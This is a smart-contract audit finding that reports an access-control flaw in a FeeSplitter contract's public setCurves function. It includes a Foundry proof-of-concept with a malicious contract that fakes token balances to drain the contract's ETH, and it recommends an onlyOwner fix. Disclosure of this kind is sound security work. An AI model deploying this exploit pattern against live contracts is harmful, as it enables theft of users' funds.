

## [H-01]  Attacker can drain FeeSplitter ETH balance because `setCurves` function is public.

## Impact 
The fees of the contract is drained.
Detailed description of the impact of this finding.
Attack scenario:
1 - Attacker set his malicious address into the setCurves function.
2 - In the `balanceOf` function, where the malicious Curves is called, attacker set his balance to any arbitrary(max) number.
3 - Attacker calls the `claimFees` function which executes `updateFeeCredit` function. Because it calculates the balance based of overriden maliciously balanceOf function we would able to drain the funds.


**Proof-of-Concept**
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/console.sol";
import {Curves} from "../contracts/Curves.sol";
import {FeeSplitter} from "../contracts/FeeSplitter.sol";
import {CurvesERC20Factory} from "../contracts/CurvesERC20Factory.sol";
import "../contracts/CurvesERC20.sol";
import "../contracts/Security.sol";

contract CounterTest is Test {
address user1 = makeAddr("user1");
address user2 = makeAddr("user2");
address user3 = makeAddr("user3");
address user4 = makeAddr("user4");
address deployer = makeAddr("deployer");
address attacker = makeAddr("attacker");

Curves curves;
FeeSplitter feeSplitter;
CurvesERC20Factory curvesERC20Factory;
CurvesERC20 curvesERC20;
Security security;
CurvesAttack attackContract;


function setUp() external{

    vm.startPrank(deployer);
    //Set up all the neccessery contracts
    security = new Security();
    curvesERC20Factory = new CurvesERC20Factory();
    feeSplitter = new FeeSplitter();
    curves = new Curves(
        address(curvesERC20Factory),
        address(feeSplitter)
        );

    // - Set all the neccessery fees
    curves.setMaxFeePercent(20000000000000000000);
    curves.setProtocolFeePercent(50000000000000000, address(deployer)); //3% fees for the protocol
    curves.setExternalFeePercent(20000000000000000 , 20000000000000000 , 20000000000000000); //2% for the subject, refferal, holder
    curves.setERC20Factory(address(curvesERC20Factory));
    feeSplitter.setCurves(Curves(curves));

    deal(address(feeSplitter), 5 ether);

    vm.stopPrank();
}

function test_attack() external{
    ////Set-up/////
    vm.startPrank(deployer);
    deal(deployer, 1 ether);
    curves.buyCurvesToken{value: 0 ether}(address(deployer), 1);
    curves.setReferralFeeDestination(address(deployer), address(deployer));
    vm.stopPrank();

    vm.prank(user2);
    deal(user2, 1 ether);
    curves.buyCurvesToken{value: 1 ether}(address(deployer), 1);


    vm.prank(user3);
    deal(user3, 1 ether);
    curves.buyCurvesToken{value: 1 ether}(address(deployer), 1);

    ////Attack start////

    //Set up the attack contract
    vm.prank(attacker);
    attackContract = new CurvesAttack(address(curves), address(feeSplitter));
    deal(address(attackContract), 1 ether);

    //Set the malicious(attack) contract
    vm.prank(attacker);
    feeSplitter.setCurves(Curves(address(attackContract)));

    console.log("Balance of the feeSplitter before(5 ether)", address(feeSplitter).balance);
    //Drain the feeSplitter
    vm.prank(attacker);
    feeSplitter.claimFees(address(deployer));
    console.log("Balance of the feeSplitter after(0,07 ether)", address(feeSplitter).balance); 
}
}

contract CurvesAttack{
address owner;
address feeSplitter;
constructor(address _curves, address _feespliter){
    owner = msg.sender;
    feeSplitter = (_feespliter);
}

function curvesTokenBalance(address _token,  address _account) external returns(uint256) {
    if(_account == owner){
        //any malicious number
        return  2150000;
    }else{
        return 0;
    }
}
receive() external payable{}

}
```

## Tools Used
Manual Review, Foundry


## Recommended Mitigation Steps
Set the onlyOwner modifier on the setCurves function.
